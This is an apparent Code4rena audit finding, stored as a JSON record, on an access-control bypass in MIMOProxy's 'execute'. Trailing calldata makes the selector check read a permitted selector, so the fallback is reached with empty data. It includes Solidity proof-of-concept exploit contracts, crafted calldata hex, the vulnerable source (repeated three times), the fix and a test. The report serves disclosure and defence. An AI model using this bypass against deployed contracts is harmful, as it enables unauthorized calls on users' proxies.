{
  "Title": "[H-04] Incorrect implementation of access control in MIMOProxy:execute",
  "Content": "_Submitted by vlad&#95;bochok_\n\n<https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L54>\n\n<https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104>\n\n### Description\n\nThere is a function `execute` in `MIMOProxy` smart contract. The function performs a delegate call to the user-specified address with the specified data. As an access control, the function checks that either it was called by the owner or the owner has previously approved that the sender can call a specified target with specified calldata. See <https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104>.\n\nThe check itself:\n\n        if (owner != msg.sender) {\n          bytes4 selector;\n          assembly {\n            selector := calldataload(data.offset)\n          }\n          if (!_permissions[msg.sender][target][selector]) {\n            revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);\n          }\n        }\n\nThe problem is how the `selector` is calculated. Specifically, `calldataload(data.offset)` - reads first 4 bytes of `data`.  Imagine `data.length == 0`, does it mean that `calldataload(data.offset)` will return `bytes4(0)`? No.\n\nLet's see how calldata are accepted by functions in Solidity. The solidity function checks that the calldata length is less than needed, but does NOT check that there is no redundant data in calldata. That means, the function `execute(address target, bytes calldata data)` will definitely accept data that have `target` and `data`, but also in calldata can be other user-provided bytes. As a result,  `calldataload(data.offset)` can read trash, but not the `data` bytes.\n\nAnd in the case of `execute` function, an attacker can affect the execution by providing `trash` data at the end of the function. Namely, if the attacker has permission to call the function with some `signature`, the attacker can call proxy contract bypass check for signature and make delegate call directly with zero calldata.\n\nPlease see proof-of-concept (PoC), `getAttackerCalldata` returns a calldata with which it is possible to bypass check permission for signature. Function `execute` from PoC simulate check for permission to call `signatureWithPermision`, and enforce that `data.length == 0`. With calldata from `getAttackerCalldata` it works.\n\n### Impact\n\nAny account that has permission to call at least one function (signature) to the contract can call fallback function without permission to do so.\n\n### Proof of Concept\n\n    // SPDX-License-Identifier: MIT OR Apache-2.0\n\n    pragma solidity ^0.8.0;\n\n    interface IMIMOProxy {\n      event Execute(address indexed target, bytes data, bytes response);\n\n      event TransferOwnership(address indexed oldOwner, address indexed newOwner);\n\n      function initialize() external;\n\n      function getPermission(\n        address envoy,\n        address target,\n        bytes4 selector\n      ) external view returns (bool);\n\n      function owner() external view returns (address);\n\n      function minGasReserve() external view returns (uint256);\n\n      function execute(address target, bytes calldata data) external payable returns (bytes memory response);\n\n      function setPermission(\n        address envoy,\n        address target,\n        bytes4 selector,\n        bool permission\n      ) external;\n\n      function transferOwnership(address newOwner) external;\n\n      function multicall(address[] calldata targets, bytes[] calldata data) external returns (bytes[] memory);\n    }\n\n    contract PoC {\n        bytes4 public signatureWithPermision = bytes4(0xffffffff);\n\n        // Call this function with calldata that can be prepared in `getAttackerCalldata`\n        function execute(address target, bytes calldata data) external {\n            bytes4 selector;\n            assembly {\n                selector := calldataload(data.offset)\n            }\n\n            require(selector == signatureWithPermision);\n\n            require(data.length == 0);\n        }\n\n        // Function that prepare attacker calldata\n        function getAttackerCalldata() public view returns(bytes memory)  {\n            bytes memory usualCalldata = abi.encodeWithSelector(IMIMOProxy.execute.selector, msg.sender, new bytes(0));\n            return abi.encodePacked(usualCalldata, bytes32(signatureWithPermision));\n        }\n    }\n\n### Recommended Mitigation Steps\n\nAdd `require(data.length >= 4);`.\n\n**[RayXpub (Mimo) commented](https://github.com/code-423n4/2022-08-mimo-findings/issues/159#issuecomment-1210479234):**\n > We were not able to recreate the provided POC. The explanation is also incomplete - we don't see how an attacker could bypass the permissions check through providing extra calldata in a signature. Please provide more details, or a working POC, on how the extra data can bypass the permissions check.\n\n**[gzeoneth (judge) commented](https://github.com/code-423n4/2022-08-mimo-findings/issues/159#issuecomment-1221562576):**\n > This POC looks valid to me.\n> \n> Basically what the warden mean is if you construct the calldata like execute(some_addr, \"\") + 0xffffff\n> ```\n> 0x1cff79cd0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc400000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000^ffffffff\n> ```\n> `data.offset` would be at ^<br>\n> and `calldataload(data.offset)` would read 0xffffff\n> \n\n**[gzeoneth (judge) commented](https://github.com/code-423n4/2022-08-mimo-findings/issues/159#issuecomment-1222005782):**\n> This might be clearer\n> ```solidity\n> pragma solidity ^0.8.0;\n> \n> contract PoC {\n>     bytes4 public signatureWithPermision = bytes4(0xdead1337);\n> \n>     // Call this function with calldata that can be prepared in `getAttackerCalldata`\n>     function execute(address target, bytes calldata data) view external returns(bytes memory) {\n>         bytes4 selector;\n>         assembly {\n>             selector := calldataload(data.offset)\n>         }\n>         require(selector == signatureWithPermision, \"bad selector\");\n>         return data;\n>     }\n> \n>     // Function that prepare attacker calldata\n>     function getAttackerCalldata() public view returns(bytes memory)  {\n>         bytes memory usualCalldata = abi.encodeWithSelector(this.execute.selector, msg.sender, new bytes(0));\n>         return abi.encodePacked(usualCalldata, signatureWithPermision);\n>     }\n> \n>     function exploit() external returns(bytes memory data) {\n>         (, data) = address(this).call(getAttackerCalldata());\n>     }\n> }\n> ```\n> \n> If you call `exploit`, it would succeed but it shouldn't (since exploit call execute with `0x00000000....` instead of the permitted 4bytes `0xdead1337`). \n> \n> The exploit here is if you permitted contract A to run function foo only, A.fallback() is also permitted.\n> \n> Your `getSelector` PoC won't work if you are passing a non-empty bytes, it would work if you construct a call like `0x0cbd17c800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000dead1337`<br>\n> which is equivalent to calling `getSelector(\"\")` with some extra data `dead1337` at the end.\n> \n> Consider the calldata layout<br>\n> [00] 0cbd17c8<br>\n> [04] 0000000000000000000000000000000000000000000000000000000000000020 (data offset)<br>\n> [24] 0000000000000000000000000000000000000000000000000000000000000000 (data len)<br>\n> [44] dead1337\n> \n> data.offset = 0x04 + 0x20 (data offset) + 0x20 (1 word for length) = 0x44\n\n**[RayXpub (Mimo) confirmed](https://github.com/code-423n4/2022-08-mimo-findings/issues/159)** \n\n**horsefacts (warden) reviewed mitigation:**\n> **Status:** ✅ Resolved\n\n> **Finding:** A warden identified that callers could bypass a permissions check in `MIMOProxy#execute` by passing specially constructed calldata, enabling the caller to invoke a contract’s fallback function.\n\n> **What changed:** `MIMOProxy#execute` now reads the first four bytes of the `data` parameter directly rather than using `data.offset` to extract the function selector from calldata. \n\n> **Why it works:** Since attackers can no longer manipulate the extracted selector, they cannot bypass the permissions check. A [unit test](https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/01_unit/proxy/MIMOProxy.test.ts#L103) demonstrates this behavior.\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-08-mimo-august-2022-contest",
  "Code": [
    {
      "filename": "contracts/proxy/MIMOProxy.sol",
      "content": "// SPDX-License-Identifier: Unlicense\npragma solidity >=0.8.4;\n\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\nimport \"../libraries/BoringBatchable.sol\";\nimport \"./interfaces/IMIMOProxy.sol\";\nimport { CustomErrors } from \"../libraries/CustomErrors.sol\";\n\n/// @title MIMOProxy\n/// @notice Used as a proxy to access VaultsCore from a user or a rebalancer\ncontract MIMOProxy is IMIMOProxy, Initializable, BoringBatchable {\n  /// PUBLIC STORAGE ///\n\n  /// @inheritdoc IMIMOProxy\n  address public override owner;\n\n  /// @inheritdoc IMIMOProxy\n  uint256 public override minGasReserve;\n\n  /// INTERNAL STORAGE ///\n\n  /// @notice Maps envoys to target contracts to function selectors to boolean flags.\n  mapping(address => mapping(address => mapping(bytes4 => bool))) internal _permissions;\n\n  /// CONSTRUCTOR ///\n\n  /// @inheritdoc IMIMOProxy\n  function initialize() external initializer {\n    minGasReserve = 5_000;\n    owner = msg.sender;\n    emit TransferOwnership(address(0), msg.sender);\n  }\n\n  /// FALLBACK FUNCTION ///\n\n  /// @dev Called when Ether is sent and the call data is empty.\n  receive() external payable {}\n\n  /// PUBLIC CONSTANT FUNCTIONS ///\n\n  /// @inheritdoc IMIMOProxy\n  function getPermission(\n    address envoy,\n    address target,\n    bytes4 selector\n  ) external view override returns (bool) {\n    return _permissions[envoy][target][selector];\n  }\n\n  /// PUBLIC NON-CONSTANT FUNCTIONS ///\n\n  /// @inheritdoc IMIMOProxy\n  function execute(address target, bytes calldata data) public payable override returns (bytes memory response) {\n    // Check that the caller is either the owner or an envoy.\n    if (owner != msg.sender) {\n      bytes4 selector;\n      assembly {\n        selector := calldataload(data.offset)\n      }\n      if (!_permissions[msg.sender][target][selector]) {\n        revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);\n      }\n    }\n\n    // Check that the target is a valid contract.\n    if (target.code.length == 0) {\n      revert CustomErrors.TARGET_INVALID(target);\n    }\n\n    // Save the owner address in memory. This local variable cannot be modified during the DELEGATECALL.\n    address owner_ = owner;\n\n    // Reserve some gas to ensure that the function has enough to finish the execution.\n    uint256 stipend = gasleft() - minGasReserve;\n\n    // Delegate call to the target contract.\n    bool success;\n    (success, response) = target.delegatecall{ gas: stipend }(data);\n\n    // Check that the owner has not been changed.\n    if (owner_ != owner) {\n      revert CustomErrors.OWNER_CHANGED(owner_, owner);\n    }\n\n    // Log the execution.\n    emit Execute(target, data, response);\n\n    // Check if the call was successful or not.\n    if (!success) {\n      // If there is return data, the call reverted with a reason or a custom error.\n      if (response.length > 0) {\n        assembly {\n          let returndata_size := mload(response)\n          revert(add(32, response), returndata_size)\n        }\n      } else {\n        revert CustomErrors.EXECUTION_REVERTED();\n      }\n    }\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function setPermission(\n    address envoy,\n    address target,\n    bytes4 selector,\n    bool permission\n  ) public override {\n    if (owner != msg.sender) {\n      revert CustomErrors.NOT_OWNER(owner, msg.sender);\n    }\n    _permissions[envoy][target][selector] = permission;\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function transferOwnership(address newOwner) external override {\n    address oldOwner = owner;\n    if (oldOwner != msg.sender) {\n      revert CustomErrors.NOT_OWNER(oldOwner, msg.sender);\n    }\n    owner = newOwner;\n    emit TransferOwnership(oldOwner, newOwner);\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function multicall(address[] calldata targets, bytes[] calldata data) external override returns (bytes[] memory) {\n    if (msg.sender != owner) {\n      revert CustomErrors.NOT_OWNER(owner, msg.sender);\n    }\n    bytes[] memory results = new bytes[](data.length);\n    for (uint256 i = 0; i < targets.length; i++) {\n      (bool success, bytes memory response) = targets[i].call(data[i]);\n      if (!success) {\n        if (response.length > 0) {\n          assembly {\n            let returndata_size := mload(response)\n            revert(add(32, response), returndata_size)\n          }\n        } else {\n          revert CustomErrors.LOW_LEVEL_CALL_FAILED();\n        }\n      }\n      results[i] = response;\n    }\n    return results;\n  }\n}"
    },
    {
      "filename": "contracts/proxy/MIMOProxy.sol",
      "content": "// SPDX-License-Identifier: Unlicense\npragma solidity >=0.8.4;\n\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\nimport \"../libraries/BoringBatchable.sol\";\nimport \"./interfaces/IMIMOProxy.sol\";\nimport { CustomErrors } from \"../libraries/CustomErrors.sol\";\n\n/// @title MIMOProxy\n/// @notice Used as a proxy to access VaultsCore from a user or a rebalancer\ncontract MIMOProxy is IMIMOProxy, Initializable, BoringBatchable {\n  /// PUBLIC STORAGE ///\n\n  /// @inheritdoc IMIMOProxy\n  address public override owner;\n\n  /// @inheritdoc IMIMOProxy\n  uint256 public override minGasReserve;\n\n  /// INTERNAL STORAGE ///\n\n  /// @notice Maps envoys to target contracts to function selectors to boolean flags.\n  mapping(address => mapping(address => mapping(bytes4 => bool))) internal _permissions;\n\n  /// CONSTRUCTOR ///\n\n  /// @inheritdoc IMIMOProxy\n  function initialize() external initializer {\n    minGasReserve = 5_000;\n    owner = msg.sender;\n    emit TransferOwnership(address(0), msg.sender);\n  }\n\n  /// FALLBACK FUNCTION ///\n\n  /// @dev Called when Ether is sent and the call data is empty.\n  receive() external payable {}\n\n  /// PUBLIC CONSTANT FUNCTIONS ///\n\n  /// @inheritdoc IMIMOProxy\n  function getPermission(\n    address envoy,\n    address target,\n    bytes4 selector\n  ) external view override returns (bool) {\n    return _permissions[envoy][target][selector];\n  }\n\n  /// PUBLIC NON-CONSTANT FUNCTIONS ///\n\n  /// @inheritdoc IMIMOProxy\n  function execute(address target, bytes calldata data) public payable override returns (bytes memory response) {\n    // Check that the caller is either the owner or an envoy.\n    if (owner != msg.sender) {\n      bytes4 selector;\n      assembly {\n        selector := calldataload(data.offset)\n      }\n      if (!_permissions[msg.sender][target][selector]) {\n        revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);\n      }\n    }\n\n    // Check that the target is a valid contract.\n    if (target.code.length == 0) {\n      revert CustomErrors.TARGET_INVALID(target);\n    }\n\n    // Save the owner address in memory. This local variable cannot be modified during the DELEGATECALL.\n    address owner_ = owner;\n\n    // Reserve some gas to ensure that the function has enough to finish the execution.\n    uint256 stipend = gasleft() - minGasReserve;\n\n    // Delegate call to the target contract.\n    bool success;\n    (success, response) = target.delegatecall{ gas: stipend }(data);\n\n    // Check that the owner has not been changed.\n    if (owner_ != owner) {\n      revert CustomErrors.OWNER_CHANGED(owner_, owner);\n    }\n\n    // Log the execution.\n    emit Execute(target, data, response);\n\n    // Check if the call was successful or not.\n    if (!success) {\n      // If there is return data, the call reverted with a reason or a custom error.\n      if (response.length > 0) {\n        assembly {\n          let returndata_size := mload(response)\n          revert(add(32, response), returndata_size)\n        }\n      } else {\n        revert CustomErrors.EXECUTION_REVERTED();\n      }\n    }\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function setPermission(\n    address envoy,\n    address target,\n    bytes4 selector,\n    bool permission\n  ) public override {\n    if (owner != msg.sender) {\n      revert CustomErrors.NOT_OWNER(owner, msg.sender);\n    }\n    _permissions[envoy][target][selector] = permission;\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function transferOwnership(address newOwner) external override {\n    address oldOwner = owner;\n    if (oldOwner != msg.sender) {\n      revert CustomErrors.NOT_OWNER(oldOwner, msg.sender);\n    }\n    owner = newOwner;\n    emit TransferOwnership(oldOwner, newOwner);\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function multicall(address[] calldata targets, bytes[] calldata data) external override returns (bytes[] memory) {\n    if (msg.sender != owner) {\n      revert CustomErrors.NOT_OWNER(owner, msg.sender);\n    }\n    bytes[] memory results = new bytes[](data.length);\n    for (uint256 i = 0; i < targets.length; i++) {\n      (bool success, bytes memory response) = targets[i].call(data[i]);\n      if (!success) {\n        if (response.length > 0) {\n          assembly {\n            let returndata_size := mload(response)\n            revert(add(32, response), returndata_size)\n          }\n        } else {\n          revert CustomErrors.LOW_LEVEL_CALL_FAILED();\n        }\n      }\n      results[i] = response;\n    }\n    return results;\n  }\n}"
    },
    {
      "filename": "contracts/proxy/MIMOProxy.sol",
      "content": "// SPDX-License-Identifier: Unlicense\npragma solidity >=0.8.4;\n\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\nimport \"../libraries/BoringBatchable.sol\";\nimport \"./interfaces/IMIMOProxy.sol\";\nimport { CustomErrors } from \"../libraries/CustomErrors.sol\";\n\n/// @title MIMOProxy\n/// @notice Used as a proxy to access VaultsCore from a user or a rebalancer\ncontract MIMOProxy is IMIMOProxy, Initializable, BoringBatchable {\n  /// PUBLIC STORAGE ///\n\n  /// @inheritdoc IMIMOProxy\n  address public override owner;\n\n  /// @inheritdoc IMIMOProxy\n  uint256 public override minGasReserve;\n\n  /// INTERNAL STORAGE ///\n\n  /// @notice Maps envoys to target contracts to function selectors to boolean flags.\n  mapping(address => mapping(address => mapping(bytes4 => bool))) internal _permissions;\n\n  /// CONSTRUCTOR ///\n\n  /// @inheritdoc IMIMOProxy\n  function initialize() external initializer {\n    minGasReserve = 5_000;\n    owner = msg.sender;\n    emit TransferOwnership(address(0), msg.sender);\n  }\n\n  /// FALLBACK FUNCTION ///\n\n  /// @dev Called when Ether is sent and the call data is empty.\n  receive() external payable {}\n\n  /// PUBLIC CONSTANT FUNCTIONS ///\n\n  /// @inheritdoc IMIMOProxy\n  function getPermission(\n    address envoy,\n    address target,\n    bytes4 selector\n  ) external view override returns (bool) {\n    return _permissions[envoy][target][selector];\n  }\n\n  /// PUBLIC NON-CONSTANT FUNCTIONS ///\n\n  /// @inheritdoc IMIMOProxy\n  function execute(address target, bytes calldata data) public payable override returns (bytes memory response) {\n    // Check that the caller is either the owner or an envoy.\n    if (owner != msg.sender) {\n      bytes4 selector;\n      assembly {\n        selector := calldataload(data.offset)\n      }\n      if (!_permissions[msg.sender][target][selector]) {\n        revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);\n      }\n    }\n\n    // Check that the target is a valid contract.\n    if (target.code.length == 0) {\n      revert CustomErrors.TARGET_INVALID(target);\n    }\n\n    // Save the owner address in memory. This local variable cannot be modified during the DELEGATECALL.\n    address owner_ = owner;\n\n    // Reserve some gas to ensure that the function has enough to finish the execution.\n    uint256 stipend = gasleft() - minGasReserve;\n\n    // Delegate call to the target contract.\n    bool success;\n    (success, response) = target.delegatecall{ gas: stipend }(data);\n\n    // Check that the owner has not been changed.\n    if (owner_ != owner) {\n      revert CustomErrors.OWNER_CHANGED(owner_, owner);\n    }\n\n    // Log the execution.\n    emit Execute(target, data, response);\n\n    // Check if the call was successful or not.\n    if (!success) {\n      // If there is return data, the call reverted with a reason or a custom error.\n      if (response.length > 0) {\n        assembly {\n          let returndata_size := mload(response)\n          revert(add(32, response), returndata_size)\n        }\n      } else {\n        revert CustomErrors.EXECUTION_REVERTED();\n      }\n    }\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function setPermission(\n    address envoy,\n    address target,\n    bytes4 selector,\n    bool permission\n  ) public override {\n    if (owner != msg.sender) {\n      revert CustomErrors.NOT_OWNER(owner, msg.sender);\n    }\n    _permissions[envoy][target][selector] = permission;\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function transferOwnership(address newOwner) external override {\n    address oldOwner = owner;\n    if (oldOwner != msg.sender) {\n      revert CustomErrors.NOT_OWNER(oldOwner, msg.sender);\n    }\n    owner = newOwner;\n    emit TransferOwnership(oldOwner, newOwner);\n  }\n\n  /// @inheritdoc IMIMOProxy\n  function multicall(address[] calldata targets, bytes[] calldata data) external override returns (bytes[] memory) {\n    if (msg.sender != owner) {\n      revert CustomErrors.NOT_OWNER(owner, msg.sender);\n    }\n    bytes[] memory results = new bytes[](data.length);\n    for (uint256 i = 0; i < targets.length; i++) {\n      (bool success, bytes memory response) = targets[i].call(data[i]);\n      if (!success) {\n        if (response.length > 0) {\n          assembly {\n            let returndata_size := mload(response)\n            revert(add(32, response), returndata_size)\n          }\n        } else {\n          revert CustomErrors.LOW_LEVEL_CALL_FAILED();\n        }\n      }\n      results[i] = response;\n    }\n    return results;\n  }\n}"
    },
    {
      "filename": "test/01_unit/proxy/MIMOProxy.test.ts",
      "content": "import chai, { expect } from \"chai\";\nimport { solidity } from \"ethereum-waffle\";\nimport { deployments, ethers } from \"hardhat\";\nimport {\n  CollisionAttacker,\n  MIMOProxy,\n  MIMOProxyActions,\n  MIMOProxyFactory,\n  MIMOProxyGuard,\n  MockAction,\n  SelectorBypass,\n} from \"../../../typechain\";\nimport { getSelector } from \"../../utils\";\n\nchai.use(solidity);\n\nconst setup = deployments.createFixture(async () => {\n  await deployments.fixture([\"Proxy\", \"MIMOProxyActions\"]);\n  const { deploy } = deployments;\n  const [owner, alice] = await ethers.getSigners();\n  const mimoProxyFactory: MIMOProxyFactory = await ethers.getContract(\"MIMOProxyFactory\");\n  await mimoProxyFactory.deploy();\n  const mimoProxyAddress = await mimoProxyFactory.getCurrentProxy(owner.address);\n  const mimoProxy: MIMOProxy = await ethers.getContractAt(\"MIMOProxy\", mimoProxyAddress);\n  const mimoProxyActions: MIMOProxyActions = await ethers.getContract(\"MIMOProxyActions\");\n  const { proxyGuard } = await mimoProxyFactory.getProxyState(mimoProxy.address);\n  const mimoProxyGuard: MIMOProxyGuard = await ethers.getContractAt(\"MIMOProxyGuard\", proxyGuard);\n\n  await deploy(\"SelectorBypass\", {\n    from: owner.address,\n    args: [mimoProxy.address],\n  });\n\n  await deploy(\"MockAction\", {\n    from: owner.address,\n  });\n\n  const selectorBypass: SelectorBypass = await ethers.getContract(\"SelectorBypass\");\n  const mockAction: MockAction = await ethers.getContract(\"MockAction\");\n\n  await deploy(\"CollisionAttacker\", {\n    from: owner.address,\n    args: [],\n  });\n\n  const attacker: CollisionAttacker = await ethers.getContract(\"CollisionAttacker\");\n\n  return {\n    deploy,\n    owner,\n    alice,\n    mimoProxyFactory,\n    mimoProxy,\n    attacker,\n    mimoProxyActions,\n    mimoProxyGuard,\n    selectorBypass,\n    mockAction,\n  };\n});\n\ndescribe(\"--- MIMOProxy Unit Tests ---\", () => {\n  it(\"should be able to withdraw ETH from proxy\", async () => {\n    const { mimoProxy, owner, alice, mimoProxyActions } = await setup();\n    const ownerBalanceBefore = await owner.getBalance();\n    const aliceBalanceBefore = await alice.getBalance();\n    const mimoProxyBalanceBefore = await ethers.provider.getBalance(mimoProxy.address);\n    await alice.sendTransaction({ to: mimoProxy.address, value: ethers.utils.parseEther(\"10\") });\n    await mimoProxy.execute(mimoProxyActions.address, mimoProxyActions.interface.encodeFunctionData(\"withdrawETH\"));\n    const ownerBalanceAfter = await owner.getBalance();\n    const aliceBalanceAfter = await alice.getBalance();\n    const mimoProxyBalanceAfter = await ethers.provider.getBalance(mimoProxy.address);\n    expect(Number(ownerBalanceAfter.sub(ownerBalanceBefore))).to.be.closeTo(1e19, 1e14);\n    expect(Number(aliceBalanceBefore.sub(aliceBalanceAfter))).to.be.closeTo(1e19, 1e14);\n    expect(mimoProxyBalanceBefore).to.be.equal(ethers.constants.Zero);\n    expect(mimoProxyBalanceAfter).to.be.equal(ethers.constants.Zero);\n  });\n  it(\"should revert if execute() called by non owner without permission\", async () => {\n    const { owner, alice, mimoProxy, mimoProxyFactory } = await setup();\n    const selector = getSelector(mimoProxyFactory.interface.functions[\"deploy()\"].format());\n    await expect(\n      mimoProxy\n        .connect(alice)\n        .execute(mimoProxyFactory.address, mimoProxyFactory.interface.encodeFunctionData(\"deploy\")),\n    ).to.be.revertedWith(\n      `EXECUTION_NOT_AUTHORIZED(\"${owner.address}\", \"${alice.address}\", \"${mimoProxyFactory.address}\", \"${selector}\")`,\n    );\n  });\n  it(\"should revert if target is invalid\", async () => {\n    const { alice, mimoProxy, mimoProxyFactory } = await setup();\n    await expect(\n      mimoProxy.execute(alice.address, mimoProxyFactory.interface.encodeFunctionData(\"deploy\")),\n    ).to.be.revertedWith(`TARGET_INVALID(\"${alice.address}\")`);\n  });\n  it(\"should not be able to override mimoProxyFactory\", async () => {\n    const { alice, mimoProxy, attacker, mimoProxyFactory } = await setup();\n    const mimoProxyFactoryBefore = await mimoProxy.proxyFactory();\n    mimoProxy.execute(attacker.address, attacker.interface.encodeFunctionData(\"overrideProxyFactory\", [alice.address]));\n    const mimoProxyFactoryAfter = await mimoProxy.proxyFactory();\n    expect(mimoProxyFactoryBefore).to.be.equal(mimoProxyFactory.address);\n    expect(mimoProxyFactoryAfter).to.be.equal(mimoProxyFactory.address);\n  });\n  it(\"should not be able to bypass selector check\", async () => {\n    const { mimoProxyGuard, selectorBypass, mockAction } = await setup();\n    const depositSelector = getSelector(mockAction.interface.functions[\"deposit()\"].format());\n    await mimoProxyGuard.setPermission(selectorBypass.address, mockAction.address, depositSelector, true);\n    await expect(selectorBypass.exploit(mockAction.address, depositSelector)).to.be.revertedWith(\n      \"EXECUTION_REVERTED()\",\n    );\n  });\n});"
    }
  ]
}